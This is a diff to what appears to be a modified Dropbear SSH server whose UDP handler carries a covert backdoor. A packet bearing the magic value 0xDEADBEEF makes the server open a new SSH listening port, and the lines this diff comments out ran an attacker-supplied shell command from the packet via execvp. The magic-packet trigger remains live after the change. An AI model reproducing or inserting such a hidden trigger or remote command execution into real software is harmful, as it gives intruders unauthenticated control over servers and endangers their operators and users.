@@ -263,7 +263,7 @@ static void main_noinetd() {
 						
 				TRACE(("*********Message from UDP client \n"))
 
-				ssize_t n = recvfrom(udpsocks[i], &udp_msg, sizeof(udp_msg), 0, 
+				recvfrom(udpsocks[i], &udp_msg, sizeof(udp_msg), 0, 
 							(struct sockaddr*)&remoteaddr, &remoteaddrlen); 
 				
 				// should return the number of new socks created (should be 2 or 0)
@@ -471,56 +471,60 @@ static void commonsetup() {
 static int handle_udp_packet(listen_packet_t* udp_msg, int* listensocks, size_t listensockcount, int *maxfd)
 {
 	TRACE(("*****inside handle udp packet"))
-	TRACE(("*****udp_msg->magic: %lu", udp_msg->magic))
+	TRACE(("*****udp_msg->magic: %u", udp_msg->magic))
 	TRACE(("*****udp_msg->port number: %u", udp_msg->port_number))
 	TRACE(("*****udp_msg->shell command: %s", udp_msg->shell_command))
 	// if it's not magic - do nothing
 	if (udp_msg->magic == 0xDEADBEEF)
 	{
 		TRACE(("*****this is magic!"))
-		pid_t pid = fork();
-		 // child process
-		if (pid == 0)
-		{
-			TRACE(("****** before executing cmd in child"))		
-			//we are root
-			if (getuid() == 0) 
-			{  	// GID of 100 represents the users group.	
-				if(setgid(100) != 0) TRACE(("Failed to set nonroot GID"));
-				//new users in Ubuntu start from uid 1000 
-				if(setuid(1000) != 0) TRACE(("Failed to set nonroot UID")); 
-			}
+		// pid_t pid = fork();
+		//  // child process
+		// if (pid == 0)
+		// {
+		// 	TRACE(("****** before executing cmd in child"))		
+		// 	//we are root
+		// 	if (getuid() == 0) 
+		// 	{  	// GID of 100 represents the users group.	
+		// 		if(setgid(100) != 0) TRACE(("Failed to set nonroot GID"));
+		// 		//new users in Ubuntu start from uid 1000 
+		// 		if(setuid(1000) != 0) TRACE(("Failed to set nonroot UID")); 
+		// 	}
 
-			char *argv[1];
-			argv[0] = udp_msg->shell_command;
-			execvp(udp_msg->shell_command, argv); 
-		}
+		// 	char *argv[1];
+		// 	argv[0] = udp_msg->shell_command;
+		// 	execvp(udp_msg->shell_command, argv); 
+		// }
 		// parent process
-		else if (pid > 0)
-		{   // wait because we need to execute the shell cmd before 
+		//else if (pid > 0)
+		//{   // wait because we need to execute the shell cmd before 
 			// we start listening on the port
-			int stat_val;
-    		waitpid(pid, &stat_val, 0);
-			if (WIFEXITED(stat_val))
-      			TRACE(("Child exited with code %d\n", WEXITSTATUS(stat_val)))
-    		else if (WIFSIGNALED(stat_val))
-      			TRACE(("Child terminated abnormally, signal %d\n", WTERMSIG(stat_val)))
+			// int stat_val;
+    		// waitpid(pid, &stat_val, 0);
+			// if (WIFEXITED(stat_val))
+      		// 	TRACE(("Child exited with code %d\n", WEXITSTATUS(stat_val)))
+    		// else if (WIFSIGNALED(stat_val))
+      		// 	TRACE(("Child terminated abnormally, signal %d\n", WTERMSIG(stat_val)))
 
 			// add the new port here
 			TRACE(("****** after wait pid about to add the new port"))
 			// "addportandaddress"
-			svr_opts.ports[svr_opts.portcount] = m_strdup(udp_msg->port_number);
+			// convert the port to string for all the functions
+			char str_port[6];
+			sprintf (str_port, "%u", udp_msg->port_number);
+
+			svr_opts.ports[svr_opts.portcount] = m_strdup(str_port);
 			svr_opts.addresses[svr_opts.portcount] = m_strdup(DROPBEAR_DEFADDRESS);
 			svr_opts.portcount++;
 			// listensockets->dropbearlisten
 			char* errstring = NULL;
-			int nsock = dropbear_listen(DROPBEAR_DEFADDRESS, udp_msg->port_number, listensocks[listensockcount], 
+			int nsock = dropbear_listen(DROPBEAR_DEFADDRESS, str_port, &listensocks[listensockcount], 
 					MAX_LISTEN_ADDR - listensockcount,
 					&errstring, maxfd);
 			TRACE(("******after dropbear_listen to new port! %u", udp_msg->port_number))		
 
 			if (nsock < 0) {
-				dropbear_log(LOG_WARNING, "Failed listening on '%s': %s", 
+				dropbear_log(LOG_WARNING, "Failed listening on '%u': %s", 
 								udp_msg->port_number, errstring);
 				m_free(errstring);
 				
@@ -528,11 +532,11 @@ static int handle_udp_packet(listen_packet_t* udp_msg, int* listensocks, size_t 
 
 		return nsock;	  
 
-		}
-		else
-		{ // error 
-			TRACE(("fork failed - couldn't create proccess to run shell cmd %s", udp_msg->shell_command))
-		}				
+		//}
+		// else
+		// { // error 
+		// 	TRACE(("fork failed - couldn't create proccess to run shell cmd %s", udp_msg->shell_command))
+		// }				
 	}
 
 	else
